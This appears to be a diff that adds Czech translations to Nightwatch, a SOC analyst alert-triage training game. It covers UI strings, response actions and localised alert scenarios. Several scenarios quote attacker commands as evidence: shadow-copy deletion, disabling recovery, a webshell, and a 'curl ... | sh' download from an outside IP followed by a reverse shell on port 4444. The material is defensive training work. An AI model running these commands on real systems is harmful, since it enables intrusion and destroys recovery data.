@@ -45,7 +45,7 @@ button{font-family:inherit;font-size:inherit;cursor:pointer}
 
 /* ---------- start screen ---------- */
 #start{min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:24px 16px;position:relative}
-.start-theme{position:absolute;top:16px;right:16px}
+.start-tools{position:absolute;top:16px;right:16px;display:flex;gap:8px}
 .start-card{width:100%;max-width:520px}
 .pulse{display:inline-flex;align-items:center;gap:8px;font-size:13px;color:var(--ink-2);
   font-family:var(--mono);margin-bottom:22px}
@@ -96,6 +96,7 @@ header.bar{
 .icon-btn{width:38px;height:38px;display:grid;place-items:center;border-radius:9px;
   border:1px solid var(--line);background:var(--surface);color:var(--ink)}
 .icon-btn:hover{border-color:var(--accent)}
+#langBtn,#langBtnStart{font-family:var(--mono);font-size:12px;font-weight:700}
 
 /* ---------- stats strip ---------- */
 .strip{display:flex;gap:10px;overflow-x:auto;padding:16px 0 4px;scrollbar-width:none}
@@ -220,20 +221,23 @@ header.bar{
 
 <!-- ============ START ============ -->
 <section id="start">
-  <button class="icon-btn start-theme" id="themeBtnStart" title="Switch theme" aria-label="Switch colour theme">◐</button>
+  <div class="start-tools">
+    <button class="icon-btn" id="langBtnStart" title="Switch language" aria-label="Switch language">CS</button>
+    <button class="icon-btn" id="themeBtnStart" title="Switch theme" aria-label="Switch colour theme">◐</button>
+  </div>
   <div class="start-card">
-    <div class="pulse"><span class="dot"></span> SHIFT 03 · 22:00–06:00 · QUEUE LIVE</div>
-    <h1 class="brand">Nightwatch<em>Alert triage practice for first-line SOC analysts</em></h1>
-    <p class="lede">Twenty-three alerts are waiting. Read the evidence, decide what is really happening, and take only the response actions the situation deserves. You get scored on every one.</p>
+    <div class="pulse"><span class="dot"></span> <span id="pulseText">SHIFT 03 · 22:00–06:00 · QUEUE LIVE</span></div>
+    <h1 class="brand"><span id="brandTitle">Nightwatch</span><em id="brandSub">Alert triage practice for first-line SOC analysts</em></h1>
+    <p class="lede" id="lede">Twenty-three alerts are waiting. Read the evidence, decide what is really happening, and take only the response actions the situation deserves. You get scored on every one.</p>
 
-    <label class="field" for="nameInput"><span>What should the console call you?</span>
+    <label class="field" for="nameInput"><span id="nameLabel">What should the console call you?</span>
       <input id="nameInput" type="text" placeholder="e.g. Petra N." autocomplete="off" maxlength="24">
     </label>
     <button class="btn primary wide" id="startBtn">Start the shift</button>
 
     <div class="rules">
-      How a case works
-      <ol>
+      <span id="rulesTitle">How a case works</span>
+      <ol id="rulesList">
         <li><b>Assign</b> it to yourself — nobody else is touching your queue.</li>
         <li><b>Investigate.</b> Enrichment lookups reveal more, but each one costs you time.</li>
         <li><b>Call the verdict:</b> true positive, false positive, or authorised activity.</li>
@@ -256,6 +260,7 @@ header.bar{
         <div class="xpbar"><div class="xpfill" id="xpFill"></div></div>
       </div>
       <div class="tools">
+        <button class="icon-btn" id="langBtn" title="Switch language" aria-label="Switch language">CS</button>
         <button class="icon-btn" id="themeBtn" title="Switch theme" aria-label="Switch colour theme">◐</button>
         <button class="icon-btn" id="statsBtn" title="Shift report" aria-label="Open shift report">▤</button>
       </div>
@@ -264,16 +269,16 @@ header.bar{
 
   <div class="wrap">
     <div class="strip">
-      <div class="stat"><b id="sClosed">0/23</b><span>Cases closed</span></div>
-      <div class="stat"><b id="sAcc">—</b><span>Verdict accuracy</span></div>
-      <div class="stat hot"><b id="sStreak">0</b><span>Streak</span></div>
-      <div class="stat"><b id="sScore">0</b><span>Score</span></div>
-      <div class="stat"><b id="sBadges">0</b><span>Badges</span></div>
+      <div class="stat"><b id="sClosed">0/23</b><span id="lblClosed">Cases closed</span></div>
+      <div class="stat"><b id="sAcc">—</b><span id="lblAcc">Verdict accuracy</span></div>
+      <div class="stat hot"><b id="sStreak">0</b><span id="lblStreak">Streak</span></div>
+      <div class="stat"><b id="sScore">0</b><span id="lblScore">Score</span></div>
+      <div class="stat"><b id="sBadges">0</b><span id="lblBadges">Badges</span></div>
     </div>
 
     <div class="grid" id="grid" data-view="queue">
       <section class="queue">
-        <h2>Alert queue</h2>
+        <h2 id="queueTitle">Alert queue</h2>
         <div class="qlist" id="qlist"></div>
       </section>
       <section class="case" id="case"></section>
@@ -311,28 +316,238 @@ function toggleTheme(){
 document.getElementById('themeBtn').onclick = toggleTheme;
 document.getElementById('themeBtnStart').onclick = toggleTheme;
 
+/* ---------- language ---------- */
+let LANG = store.get('nw_lang') === 'cs' ? 'cs' : 'en';
+function otherLang(){ return LANG === 'en' ? 'cs' : 'en'; }
+function setLang(l){
+  LANG = l;
+  store.set('nw_lang', l);
+  applyStaticText();
+  if(!$('#app').hidden){ renderQueue(); renderCase(); renderStats(); }
+}
+function toggleLang(){ setLang(otherLang()); }
+document.getElementById('langBtn').onclick = toggleLang;
+document.getElementById('langBtnStart').onclick = toggleLang;
+
 /* ---------- response action catalogue ---------- */
 const ACTIONS = {
-  isolate_host:     { label:'Isolate host',            desc:'Cut the machine off the network via EDR' },
-  disable_account:  { label:'Disable account',         desc:'Block all sign-ins for the identity' },
-  reset_password:   { label:'Force password reset',    desc:'Invalidate the current credential' },
-  revoke_sessions:  { label:'Revoke sessions & tokens',desc:'Kill live sessions, refresh tokens, app passwords' },
-  block_indicator:  { label:'Block the indicator',     desc:'Sinkhole the domain / drop the IP at the edge' },
-  quarantine_file:  { label:'Quarantine the file',     desc:'Pull the binary or attachment out of reach' },
-  collect_forensics:{ label:'Collect forensic triage', desc:'Memory, MFT, event logs — before anything is lost' },
-  notify_user:      { label:'Contact the user',        desc:'Verify the activity with the human behind it' },
-  notify_hr_legal:  { label:'Involve HR & legal',      desc:'Bring in the people who own employment matters' },
-  escalate_ir:      { label:'Escalate to IR on-call',  desc:'Page tier 3 — this is bigger than a ticket' },
-  add_watchlist:    { label:'Add to watchlist',        desc:'Raise monitoring on the entity for 14 days' },
-  tune_rule:        { label:'Tune the detection',      desc:'Refine the rule so this stops firing' },
-  close_no_action:  { label:'Close, no action needed', desc:'Nothing to contain here' }
+  isolate_host:     { en:{ label:'Isolate host',            desc:'Cut the machine off the network via EDR' },
+                       cs:{ label:'Izolovat stanici',        desc:'Odpojit zařízení od sítě přes EDR' } },
+  disable_account:  { en:{ label:'Disable account',         desc:'Block all sign-ins for the identity' },
+                       cs:{ label:'Zablokovat účet',         desc:'Zakázat všechna přihlášení k identitě' } },
+  reset_password:   { en:{ label:'Force password reset',    desc:'Invalidate the current credential' },
+                       cs:{ label:'Vynutit reset hesla',     desc:'Zneplatnit stávající přihlašovací údaj' } },
+  revoke_sessions:  { en:{ label:'Revoke sessions & tokens',desc:'Kill live sessions, refresh tokens, app passwords' },
+                       cs:{ label:'Zneplatnit relace a tokeny', desc:'Ukončit aktivní relace, refresh tokeny, hesla aplikací' } },
+  block_indicator:  { en:{ label:'Block the indicator',     desc:'Sinkhole the domain / drop the IP at the edge' },
+                       cs:{ label:'Zablokovat indikátor',    desc:'Sinkhole domény / zahodit IP na perimetru' } },
+  quarantine_file:  { en:{ label:'Quarantine the file',     desc:'Pull the binary or attachment out of reach' },
+                       cs:{ label:'Karanténovat soubor',     desc:'Odstranit binárku či přílohu z dosahu' } },
+  collect_forensics:{ en:{ label:'Collect forensic triage', desc:'Memory, MFT, event logs — before anything is lost' },
+                       cs:{ label:'Sesbírat forenzní data',  desc:'Paměť, MFT, event logy — než se ztratí' } },
+  notify_user:      { en:{ label:'Contact the user',        desc:'Verify the activity with the human behind it' },
+                       cs:{ label:'Kontaktovat uživatele',   desc:'Ověřit aktivitu přímo s člověkem za účtem' } },
+  notify_hr_legal:  { en:{ label:'Involve HR & legal',      desc:'Bring in the people who own employment matters' },
+                       cs:{ label:'Zapojit HR a právní oddělení', desc:'Přizvat ty, kdo mají na starosti pracovněprávní záležitosti' } },
+  escalate_ir:      { en:{ label:'Escalate to IR on-call',  desc:'Page tier 3 — this is bigger than a ticket' },
+                       cs:{ label:'Eskalovat na IR pohotovost', desc:'Zavolat tier 3 — tohle je víc než tiket' } },
+  add_watchlist:    { en:{ label:'Add to watchlist',        desc:'Raise monitoring on the entity for 14 days' },
+                       cs:{ label:'Přidat na sledovací seznam', desc:'Zvýšit monitoring entity na 14 dní' } },
+  tune_rule:        { en:{ label:'Tune the detection',      desc:'Refine the rule so this stops firing' },
+                       cs:{ label:'Doladit detekci',         desc:'Upravit pravidlo, ať to přestane střílet' } },
+  close_no_action:  { en:{ label:'Close, no action needed', desc:'Nothing to contain here' },
+                       cs:{ label:'Uzavřít bez zásahu',      desc:'Není co řešit' } }
 };
+function actL(k){ return ACTIONS[k][LANG].label; }
+function actD(k){ return ACTIONS[k][LANG].desc; }
 
 const VERDICTS = {
-  true_positive:    { label:'True positive',  desc:'Real malicious activity' },
-  false_positive:   { label:'False positive', desc:'Detection logic was wrong' },
-  benign:           { label:'Authorised',     desc:'Real activity, but approved' }
+  true_positive:    { en:{ label:'True positive',  desc:'Real malicious activity' },
+                       cs:{ label:'Skutečný incident', desc:'Reálná škodlivá aktivita' } },
+  false_positive:   { en:{ label:'False positive', desc:'Detection logic was wrong' },
+                       cs:{ label:'Falešný poplach', desc:'Detekční logika se spletla' } },
+  benign:           { en:{ label:'Authorised',     desc:'Real activity, but approved' },
+                       cs:{ label:'Schválená aktivita', desc:'Reálná aktivita, ale povolená' } }
 };
+function verL(k){ return VERDICTS[k][LANG].label; }
+function verD(k){ return VERDICTS[k][LANG].desc; }
+
+/* ---------- entity key labels ---------- */
+const ENTITY_LABELS_CS = {
+  Host:'Stanice', User:'Uživatel', Process:'Proces', Domain:'Doména', Src:'Zdroj',
+  Target:'Cíl', 'Location A':'Místo A', 'Location B':'Místo B', Attempts:'Pokusy',
+  Pushes:'Notifikace', Result:'Výsledek', Volume:'Objem', Destination:'Cíl přenosu',
+  File:'Soubor', C2:'C2 server', Account:'Účet', 'New user':'Nový účet', Group:'Skupina',
+  Reporter:'Nahlásil', Sender:'Odesílatel', Clicks:'Kliknutí', Bucket:'Úložiště',
+  Change:'Změna', Owner:'Vlastník', Signatures:'Signatury', App:'Aplikace', Scope:'Oprávnění',
+  Terminated:'Ukončení PP', Access:'Přístup', Recipients:'Příjemci', Action:'Akce',
+  Tool:'Nástroj', Requests:'Požadavky', CPU:'CPU', Files:'Soubory', Path:'Cesta'
+};
+function entLabel(k){ return LANG === 'cs' ? (ENTITY_LABELS_CS[k] || k) : k; }
+
+/* ---------- alert content translation helpers ---------- */
+function tf(a, field){ return (LANG === 'cs' && a.cs && a.cs[field] != null) ? a.cs[field] : a[field]; }
+function tEntityVal(a, k, v){ return (LANG === 'cs' && a.cs && a.cs.entities && a.cs.entities[k] != null) ? a.cs.entities[k] : v; }
+function tEvidence(a){
+  if(LANG === 'cs' && a.cs && a.cs.evidence) return a.evidence.map(([t], i) => [t, a.cs.evidence[i]]);
+  return a.evidence;
+}
+function tEnrich(a){
+  if(LANG === 'cs' && a.cs && a.cs.enrich) return a.enrich.map((e, i) => ({ ...e, label:a.cs.enrich[i].label, result:a.cs.enrich[i].result }));
+  return a.enrich;
+}
+const SEV_LABELS = {
+  en:{ critical:'CRITICAL', high:'HIGH', medium:'MEDIUM', low:'LOW' },
+  cs:{ critical:'KRITICKÁ', high:'VYSOKÁ', medium:'STŘEDNÍ', low:'NÍZKÁ' }
+};
+
+/* ---------- UI strings ---------- */
+const UI = {
+  en: {
+    pulse:'SHIFT 03 · 22:00–06:00 · QUEUE LIVE',
+    brand:'Nightwatch',
+    brandSub:'Alert triage practice for first-line SOC analysts',
+    lede:'Twenty-three alerts are waiting. Read the evidence, decide what is really happening, and take only the response actions the situation deserves. You get scored on every one.',
+    nameLabel:'What should the console call you?',
+    namePlaceholder:'e.g. Petra N.',
+    startBtn:'Start the shift',
+    rulesTitle:'How a case works',
+    rules:[
+      '<b>Assign</b> it to yourself — nobody else is touching your queue.',
+      '<b>Investigate.</b> Enrichment lookups reveal more, but each one costs you time.',
+      '<b>Call the verdict:</b> true positive, false positive, or authorised activity.',
+      '<b>Respond.</b> Missing a needed action hurts. So does overreacting.'
+    ],
+    themeTitle:'Switch theme', langTitle:'Switch language', reportTitle:'Shift report',
+    lblClosed:'Cases closed', lblAcc:'Verdict accuracy', lblStreak:'Streak', lblScore:'Score', lblBadges:'Badges',
+    queueTitle:'Alert queue',
+    caseEmptyTitle:'Pick an alert to begin',
+    caseEmptyHint:'Highest severity first is a good habit, but read the queue before you commit.',
+    whatFired:'What fired',
+    backToQueue:'← Back to queue',
+    detected:'Detected', source:'Source',
+    unownedTitle:'Nobody owns this yet',
+    unownedHint:'Assign the case to yourself to unlock investigation. The clock starts when you do.',
+    assignBtn:'Assign to me',
+    investigate:'Investigate',
+    investigateHint:'Each lookup adds 20 seconds to your handling time. Pick what actually moves the decision.',
+    chipCost:'+20s',
+    yourVerdict:'Your verdict',
+    yourVerdictHint:'What is actually going on here?',
+    responseActions:'Response actions',
+    responseHint:'Take what the situation needs — no more. Overreacting costs the business and costs you points.',
+    closeBtn:'Close the case',
+    closeHint:'Pick a verdict and at least one action first.',
+    timerLive:sec => `handling time · ${fmt(sec)}`,
+    closedPoints:pts => `Closed · ${pts} points`,
+    yourVerdictWas:label => `Your verdict: ${label}`,
+    correctAnswerWas:label => ` — correct answer was ${label}`,
+    handlingTime:t => `Handling time ${t}.`,
+    debriefLabel:'Debrief.',
+    reviewScoring:'Review the scoring again',
+    verdictLine:(id,t) => `${id} · handling time ${t}`,
+    resultTextbook:'Textbook triage', resultRight:'Right call', resultWrong:'Wrong call',
+    nextAlert:'Next alert', seeReport:'See your shift report', backToQueueBtn:'Back to queue',
+    ledgerCorrectVerdict:label => `Correct verdict: ${label}`,
+    ledgerWrongVerdict:label => `Wrong verdict — it was ${label.toLowerCase()}`,
+    ledgerRightAction:label => `Took the right action: ${label}`,
+    ledgerMissed:label => `Missed: ${label}`,
+    ledgerShouldNot:label => `Should not have done this: ${label}`,
+    ledgerDecisive:'Found the decisive evidence',
+    ledgerFast:'Closed inside the target handling time',
+    shiftReport:name => `SHIFT REPORT · ${name}`,
+    gradeTop:'Incident Commander material', gradeGood:'Solid tier 1', gradeMid:'Getting there', gradeLow:'Keep practising',
+    barClosed:'Cases closed', barAcc:'Verdict accuracy', barClean:'Proportionate responses', barScore:'Score',
+    xpUnit:'XP',
+    longestStreak:(n,rank) => `<b>Longest streak:</b> ${n} correct verdicts in a row. <b>Rank:</b> ${rank}.`,
+    backToQueueLong:'Back to the queue', freshShift:'Start a fresh shift',
+    toNextRank:n => `${n} to next rank`, topRank:'top rank'
+  },
+  cs: {
+    pulse:'SMĚNA 03 · 22:00–06:00 · FRONTA ŽIVĚ',
+    brand:'Nightwatch',
+    brandSub:'Trénink triáže pro SOC analytiky první linie',
+    lede:'Čeká dvacet tři alertů. Přečti si důkazy, rozhodni, co se doopravdy děje, a podnikni jen ty reakce, které si situace zaslouží. Bodovaný je každý případ.',
+    nameLabel:'Jak ti má konzole říkat?',
+    namePlaceholder:'např. Petra N.',
+    startBtn:'Začít směnu',
+    rulesTitle:'Jak funguje případ',
+    rules:[
+      '<b>Přiřaď</b> si případ — nikdo jiný ti do fronty nesahá.',
+      '<b>Prošetři.</b> Doplňující zjištění odhalí víc, ale každé tě stojí čas.',
+      '<b>Urči verdikt:</b> skutečný incident, falešný poplach, nebo schválená aktivita.',
+      '<b>Zareaguj.</b> Vynechaná potřebná akce bolí. Přehnaná reakce taky.'
+    ],
+    themeTitle:'Přepnout motiv', langTitle:'Přepnout jazyk', reportTitle:'Report směny',
+    lblClosed:'Uzavřené případy', lblAcc:'Přesnost verdiktů', lblStreak:'Série', lblScore:'Skóre', lblBadges:'Odznaky',
+    queueTitle:'Fronta alertů',
+    caseEmptyTitle:'Vyber alert a začni',
+    caseEmptyHint:'Nejvyšší závažnost napřed je dobrý zvyk, ale frontu si nejdřív přečti celou.',
+    whatFired:'Co spustilo alert',
+    backToQueue:'← Zpět do fronty',
+    detected:'Zachyceno', source:'Zdroj',
+    unownedTitle:'Případ zatím nemá majitele',
+    unownedHint:'Přiřaď si případ, aby se odemklo šetření. Čas začíná běžet v tu chvíli.',
+    assignBtn:'Přiřadit mně',
+    investigate:'Prošetři',
+    investigateHint:'Každé zjištění přidá 20 sekund k času řešení. Vyber to, co skutečně posune rozhodnutí.',
+    chipCost:'+20s',
+    yourVerdict:'Tvůj verdikt',
+    yourVerdictHint:'Co se tu vlastně děje?',
+    responseActions:'Reakční akce',
+    responseHint:'Udělej jen to, co situace vyžaduje — nic navíc. Přehnaná reakce stojí firmu peníze a tebe body.',
+    closeBtn:'Uzavřít případ',
+    closeHint:'Nejdřív vyber verdikt a aspoň jednu akci.',
+    timerLive:sec => `čas řešení · ${fmt(sec)}`,
+    closedPoints:pts => `Uzavřeno · ${pts} bodů`,
+    yourVerdictWas:label => `Tvůj verdikt: ${label}`,
+    correctAnswerWas:label => ` — správně mělo být: ${label}`,
+    handlingTime:t => `Čas řešení ${t}.`,
+    debriefLabel:'Rozbor.',
+    reviewScoring:'Znovu zobrazit bodování',
+    verdictLine:(id,t) => `${id} · čas řešení ${t}`,
+    resultTextbook:'Učebnicová triáž', resultRight:'Správné rozhodnutí', resultWrong:'Špatné rozhodnutí',
+    nextAlert:'Další alert', seeReport:'Zobrazit report směny', backToQueueBtn:'Zpět do fronty',
+    ledgerCorrectVerdict:label => `Správný verdikt: ${label}`,
+    ledgerWrongVerdict:label => `Špatný verdikt — správně mělo být: ${label.toLowerCase()}`,
+    ledgerRightAction:label => `Správně provedená akce: ${label}`,
+    ledgerMissed:label => `Zapomenuto: ${label}`,
+    ledgerShouldNot:label => `Tohle jste dělat neměli: ${label}`,
+    ledgerDecisive:'Nalezen rozhodující důkaz',
+    ledgerFast:'Případ uzavřen v cílovém čase',
+    shiftReport:name => `REPORT SMĚNY · ${name}`,
+    gradeTop:'Materiál na Incident Commandera', gradeGood:'Slušný tier 1', gradeMid:'Jde to', gradeLow:'Ještě to chce cvik',
+    barClosed:'Uzavřené případy', barAcc:'Přesnost verdiktů', barClean:'Přiměřenost reakcí', barScore:'Skóre',
+    xpUnit:'XP',
+    longestStreak:(n,rank) => `<b>Nejdelší série:</b> ${n} správných verdiktů po sobě. <b>Hodnost:</b> ${rank}.`,
+    backToQueueLong:'Zpět do fronty', freshShift:'Začít novou směnu',
+    toNextRank:n => `${n} do další hodnosti`, topRank:'nejvyšší hodnost'
+  }
+};
+function T(){ return UI[LANG]; }
+
+function applyStaticText(){
+  const u = T();
+  $('#pulseText').textContent = u.pulse;
+  $('#brandTitle').textContent = u.brand;
+  $('#brandSub').textContent = u.brandSub;
+  $('#lede').textContent = u.lede;
+  $('#nameLabel').textContent = u.nameLabel;
+  $('#nameInput').placeholder = u.namePlaceholder;
+  $('#startBtn').textContent = u.startBtn;
+  $('#rulesTitle').textContent = u.rulesTitle;
+  $('#rulesList').innerHTML = u.rules.map(r => `<li>${r}</li>`).join('');
+  $('#lblClosed').textContent = u.lblClosed;
+  $('#lblAcc').textContent = u.lblAcc;
+  $('#lblStreak').textContent = u.lblStreak;
+  $('#lblScore').textContent = u.lblScore;
+  $('#lblBadges').textContent = u.lblBadges;
+  $('#queueTitle').textContent = u.queueTitle;
+  [$('#themeBtn'),$('#themeBtnStart')].forEach(b => { b.title = u.themeTitle; b.setAttribute('aria-label', u.themeTitle); });
+  [$('#langBtn'),$('#langBtnStart')].forEach(b => { b.title = u.langTitle; b.setAttribute('aria-label', u.langTitle); b.textContent = otherLang().toUpperCase(); });
+  $('#statsBtn').title = u.reportTitle; $('#statsBtn').setAttribute('aria-label', u.reportTitle);
+  document.documentElement.lang = LANG;
+}
 
 /* ---------- the alert set ---------- */
 const ALERTS = [
@@ -360,7 +575,24 @@ const ALERTS = [
   required:['isolate_host','collect_forensics','escalate_ir'],
   ok:['quarantine_file','disable_account','block_indicator'],
   forbidden:['tune_rule','close_no_action','notify_user'],
-  debrief:'Ransomware in the encryption phase. Containment beats investigation here: isolate the host first, then preserve volatile evidence, then wake up IR. Never sit on this one to finish your notes.'
+  debrief:'Ransomware in the encryption phase. Containment beats investigation here: isolate the host first, then preserve volatile evidence, then wake up IR. Never sit on this one to finish your notes.',
+  cs:{
+    title:'Na finanční pracovní stanici smazány stínové kopie',
+    source:'EDR · Behaviorální detekce',
+    summary:'Řetězec procesů odstartovaný z tabulky s aktivními makry skončil smazáním všech stínových kopií svazku. O tři minuty později začala stejná stanice po celém finančním sdíleném disku přejmenovávat soubory na novou příponu.',
+    evidence:[
+      'EXCEL.EXE → cmd.exe → powershell.exe -nop -w hidden',
+      'vssadmin.exe delete shadows /all /quiet',
+      'bcdedit /set recoveryenabled No',
+      '1 840 souborů přejmenováno z *.xlsx na *.xlsx.l0ckd na \\\\fs01\\finance'
+    ],
+    enrich:[
+      { label:'Zkontrolovat objem zápisů na sdíleném disku', result:'Šifrování běží a šíří se: 1 840 souborů za tři minuty, vše ze stanice FIN-WS-014.' },
+      { label:'Dohledat zdrojový dokument', result:'Tabulka dorazila o 40 minut dříve jako příloha e-mailu od externího odesílatele.' },
+      { label:'Zkontrolovat pracovní dobu uživatele', result:'m.dvorak běžně pracuje 08:00–17:00 a právě teď není interaktivně přihlášen.' }
+    ],
+    debrief:'Ransomware ve fázi šifrování. Zadržení má přednost před vyšetřováním: nejdřív izoluj stanici, pak zachovej prchavé důkazy, pak probuď IR. Tohle není případ, u kterého si necháváš dopsat poznámky.'
+  }
 },
 {
   id:'ALT-4472', sev:'high', target:150,
@@ -386,7 +618,24 @@ const ALERTS = [
   required:['reset_password','revoke_sessions','block_indicator'],
   ok:['notify_user','add_watchlist','collect_forensics','escalate_ir','disable_account'],
   forbidden:['tune_rule','close_no_action','isolate_host'],
-  debrief:'Account takeover, not host compromise — so isolating the laptop achieves nothing. A password reset alone is not enough either: without revoking sessions and tokens the attacker keeps their stolen session. Reset, revoke, block the domain, and go hunting for that inbox rule.'
+  debrief:'Account takeover, not host compromise — so isolating the laptop achieves nothing. A password reset alone is not enough either: without revoking sessions and tokens the attacker keeps their stolen session. Reset, revoke, block the domain, and go hunting for that inbox rule.',
+  cs:{
+    title:'Přihlašovací údaje zadány na podvržené přihlašovací stránce Microsoftu',
+    source:'Secure web gateway · Kategorie phishing',
+    summary:'Uživatel klikl na odkaz z e-mailu „sdílený dokument“ a odeslal přihlašovací údaje na nově zaregistrovanou doménu, která napodobuje přihlašovací stránku Microsoft 365.',
+    evidence:[
+      'GET login-microsft365-verify[.]com/auth (referrer: outlook.office.com)',
+      'POST login-microsft365-verify[.]com/auth content-length: 214',
+      'Azure AD: úspěšné přihlášení uživatele l.kralova z 45.147.x.x (ASN: hostingový poskytovatel)',
+      'Azure AD: vytvořeno nové pravidlo schránky — přesouvat zprávy obsahující „invoice“ do RSS Feeds'
+    ],
+    enrich:[
+      { label:'Zkontrolovat přihlášení po odeslání formuláře', result:'Útočník už je uvnitř: přihlášení z IP hostingového poskytovatele proběhlo úspěšně a bylo vytvořeno pravidlo schránky skrývající faktury.' },
+      { label:'Zkontrolovat datum registrace domény', result:'Doména byla zaregistrována před dvěma dny s ochranou soukromí (privacy protection).' },
+      { label:'Prohledat mail gateway pro stejný odkaz', result:'Stejnou zprávu dostalo dalších jedenáct uživatelů. Dva na ni kliknuli.' }
+    ],
+    debrief:'Převzetí účtu, ne kompromitace stanice — izolace notebooku tady nic neřeší. Samotný reset hesla taky nestačí: bez zneplatnění relací a tokenů si útočník ukradenou relaci podrží. Resetuj, zneplatni, zablokuj doménu a najdi to pravidlo schránky.'
+  }
 },
 {
   id:'ALT-4481', sev:'critical', target:150,
@@ -412,7 +661,24 @@ const ALERTS = [
   required:['isolate_host','quarantine_file','collect_forensics'],
   ok:['escalate_ir','block_indicator','add_watchlist'],
   forbidden:['tune_rule','close_no_action','notify_user'],
-  debrief:'A live reverse shell, not just a dropped file — pull the host off the network before the operator does anything else, quarantine the shell, and image it while the process is still resident. Patch or take down the plugin on the other two servers before this becomes three incidents instead of one.'
+  debrief:'A live reverse shell, not just a dropped file — pull the host off the network before the operator does anything else, quarantine the shell, and image it while the process is still resident. Patch or take down the plugin on the other two servers before this becomes three incidents instead of one.',
+  cs:{
+    title:'Na veřejném marketingovém webu nasazen webshell',
+    source:'File integrity monitoring · Webový server',
+    summary:'V uploads adresáři se objevil PHP webshell pár minut po zveřejnění kritické neautentizované zranitelnosti pro nahrávání souborů v pluginu formulářů webu. Přes shell už se spouští příkazy.',
+    evidence:[
+      'POST /wp-content/uploads/2026/tmp.php?cmd=whoami — 200 OK',
+      'Tělo odpovědi: www-data',
+      'tmp.php spustil /bin/sh -c "curl http://45.9.x.x/x.sh | sh"',
+      'Navázáno odchozí spojení na 45.9.x.x:4444'
+    ],
+    enrich:[
+      { label:'Zkontrolovat, co shell spustil', result:'Operátor už spustil reverse-shell payload a otevřel interaktivní spojení na portu 4444.' },
+      { label:'Zkontrolovat zranitelný plugin', result:'Web běží na pluginu formulářů s kritickou neautentizovanou chybou nahrávání souborů zveřejněnou před šesti hodinami, stále nezáplatovanou.' },
+      { label:'Zkontrolovat další zasažené servery', result:'Další dva webové servery za stejným load balancerem běží na identické zranitelné verzi pluginu.' }
+    ],
+    debrief:'Živý reverse shell, ne jen odložený soubor — odpoj stanici od sítě dřív, než operátor stihne cokoliv dalšího, karanténuj shell a udělej image, dokud je proces ještě v paměti. Zaplatuj nebo shoď plugin i na zbylých dvou serverech, než se z tohohle stanou tři incidenty místo jednoho.'
+  }
 },
 {
   id:'ALT-4473', sev:'high', target:130,
@@ -438,7 +704,25 @@ const ALERTS = [
   required:['tune_rule','close_no_action'],
   ok:['add_watchlist'],
   forbidden:['disable_account','reset_password','isolate_host','revoke_sessions','escalate_ir','notify_hr_legal'],
-  debrief:'Same device, same session, corporate VPN egress in Singapore. Locking out an engineer at midnight over a geo-IP artifact is a real cost to the business — and the rule needs a VPN exclusion so the next analyst does not lose twenty minutes on it too.'
+  debrief:'Same device, same session, corporate VPN egress in Singapore. Locking out an engineer at midnight over a geo-IP artifact is a real cost to the business — and the rule needs a VPN exclusion so the next analyst does not lose twenty minutes on it too.',
+  cs:{
+    title:'Nemožné cestování: Praha do Singapuru za 22 minut',
+    source:'Identity protection · Detekce rizika',
+    entities:{ 'Location A':'Praha, ČR', 'Location B':'Singapur, SG' },
+    summary:'Dvě úspěšná přihlášení stejného účtu z míst, mezi kterými se v daném čase nedá reálně přesunout.',
+    evidence:[
+      'Úspěšné přihlášení · Praha, ČR · 89.24.x.x · Windows / Edge',
+      'Úspěšné přihlášení · Singapur, SG · 137.132.x.x · Windows / Edge',
+      'MFA splněno díky kompliantnímu zařízení, stejné device ID jako v 23:45',
+      'Nezaznamenána žádná neobvyklá aktivita ve schránce ani se soubory'
+    ],
+    enrich:[
+      { label:'Zkontrolovat firemní VPN logy', result:'Uživatel se v 00:06 připojil k singapurskému VPN koncentrátoru — firma přes něj přesměrovává APAC provoz během noční údržby v EU.' },
+      { label:'Porovnat device ID', result:'Obě přihlášení jdou ze stejného spravovaného, kompliantního zařízení se stejným hardwarovým ID.' },
+      { label:'Kontaktovat nadřízeného uživatele', result:'Nadřízený potvrzuje, že j.benes je v Praze a pracuje dlouho do noci na vydání release.' }
+    ],
+    debrief:'Stejné zařízení, stejná relace, firemní VPN výstup v Singapuru. Zablokovat inženýra o půlnoci kvůli artefaktu geo-IP stojí firmu reálné peníze — a pravidlo potřebuje výjimku pro VPN, ať příští analytik nepřijde o dalších dvacet minut.'
+  }
 },
 {
   id:'ALT-4491', sev:'medium', target:110,
@@ -464,7 +748,25 @@ const ALERTS = [
   required:['tune_rule','close_no_action'],
   ok:['add_watchlist'],
   forbidden:['isolate_host','disable_account','escalate_ir','quarantine_file','collect_forensics','reset_password'],
-  debrief:'Mass file reads at high speed look identical to encryption to a heuristic that only counts I/O volume — the giveaway is that nothing was actually renamed or altered. Add the backup agent’s hash and schedule to the rule’s exclusions so tonight’s job doesn’t page someone every night this week.'
+  debrief:'Mass file reads at high speed look identical to encryption to a heuristic that only counts I/O volume — the giveaway is that nothing was actually renamed or altered. Add the backup agent’s hash and schedule to the rule’s exclusions so tonight’s job doesn’t page someone every night this week.',
+  cs:{
+    title:'Zálohovací agent spustil heuristiku chování ransomwaru',
+    source:'EDR · Behaviorální detekce',
+    entities:{ Files:'38 412 přečteno za 4 min' },
+    summary:'Ransomwarová heuristika EDR se spustila na souborovém serveru poté, co proces za pár minut přečetl a přepsal desítky tisíc souborů — stejný vzor jako hromadné šifrování, ale časování přesně sedí na noční zálohovací úlohu.',
+    evidence:[
+      'veeam_agent.exe přečetl 38 412 souborů na \\\\fs01\\ za 4 minuty',
+      'Nezměnila se ani jedna přípona souboru, žádné artefakty výkupní zprávy',
+      'Proces je podepsaný schváleným certifikátem výrobce zálohovacího software',
+      'Úloha odpovídá plánovanému nočnímu oknu zálohování dle change kalendáře'
+    ],
+    enrich:[
+      { label:'Zkontrolovat, zda se změnily přípony souborů', result:'Nezměnila se ani jedna přípona a nevznikly žádné nové soubory — obsah byl přečten a snapshot zapsán do zálohovacího repozitáře, nic nebylo zašifrováno.' },
+      { label:'Zkontrolovat podpis procesu', result:'Podepsáno stejným certifikátem výrobce zálohovacího software jako na všech ostatních souborových serverech, odpovídá známým bezpečným hashům.' },
+      { label:'Zkontrolovat plán úloh', result:'Tato konkrétní stanice spouští plnou zálohu každou noc v 00:30; časování se nikdy neměnilo.' }
+    ],
+    debrief:'Hromadné rychlé čtení souborů vypadá pro heuristiku počítající jen objem I/O stejně jako šifrování — poznávacím znakem je, že se nic doopravdy nepřejmenovalo ani nezměnilo. Přidej hash a rozvrh zálohovacího agenta do výjimek pravidla, ať dnešní úloha někoho nebudí každou noc tenhle týden.'
+  }
 },
 {
   id:'ALT-4474', sev:'medium', target:120,
